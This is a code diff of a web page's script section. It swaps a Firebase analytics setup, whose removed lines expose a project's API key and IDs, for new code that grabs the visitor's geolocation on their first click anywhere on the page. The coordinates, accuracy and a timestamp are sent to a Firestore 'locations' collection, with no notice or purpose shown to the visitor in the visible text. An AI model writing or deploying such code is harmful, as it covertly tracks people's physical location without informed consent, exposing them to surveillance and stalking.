@@ -91,29 +91,54 @@
   </footer>
 
 <script src="app.js"></script>
-  <script type="module">
-  // Import the functions you need from the SDKs you need
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics.js";
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
+ <script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-firestore.js";
 
-  // Your web app's Firebase configuration
-  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
   const firebaseConfig = {
-    apiKey: "AIzaSyC6EOX2i_6vCqz-EwiopQyd0qwtsomOppw",
-    authDomain: "sample-4d3c3.firebaseapp.com",
-    projectId: "sample-4d3c3",
-    storageBucket: "sample-4d3c3.firebasestorage.app",
-    messagingSenderId: "1064954656144",
-    appId: "1:1064954656144:web:34252bec01b29ae5aaaf15",
-    measurementId: "G-ZBQ1PHV7BF"
+    apiKey: "YOUR_KEY",
+    authDomain: "YOUR_DOMAIN",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_BUCKET",
+    messagingSenderId: "YOUR_ID",
+    appId: "YOUR_APP_ID"
   };
 
-  // Initialize Firebase
+  // ✅ Initialize Firebase
   const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
+
+  // ✅ Location saving function
+  async function saveLocation(lat, lon, acc) {
+    try {
+      await addDoc(collection(db, "locations"), {
+        lat: lat,
+        lon: lon,
+        accuracy: acc,
+        timestamp: new Date().toISOString()
+      });
+      console.log("✅ Location saved!");
+    } catch (err) {
+      console.error("❌ Error saving location:", err);
+    }
+  }
+
+  // ✅ Auto capture after first tap
+  function autoCaptureLocation() {
+    navigator.geolocation.getCurrentPosition(pos => {
+      saveLocation(
+        pos.coords.latitude,
+        pos.coords.longitude,
+        pos.coords.accuracy
+      );
+    });
+  }
+
+  window.addEventListener("click", autoCaptureLocation, { once: true });
 </script>
-  
+
+<!-- ✅ Load your app AFTER Firebase -->
+<script src="app.js"></script>
+
 </body>
 </html>
